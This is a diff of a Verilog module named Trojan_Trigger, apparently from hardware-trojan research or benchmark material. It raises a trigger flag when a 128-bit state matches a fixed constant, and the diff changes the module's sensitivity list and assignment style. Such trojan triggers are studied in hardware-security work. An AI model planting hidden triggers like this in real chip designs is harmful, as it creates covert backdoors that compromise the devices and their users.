@@ -26,13 +26,13 @@ module Trojan_Trigger(
 
 	reg Tj_Trig;
 
-	always @(rst, state)
+	always @(clk, rst)
 	begin
 		if (rst == 1) begin
-			Tj_Trig <= 0; 
+			Tj_Trig = 0;
 		end else if (state == 128'h00112233_44556677_8899aabb_ccddeeff) begin 
-			Tj_Trig <= 1; 
-		end 
+			Tj_Trig = 1;
+		end
 	end
 
 endmodule
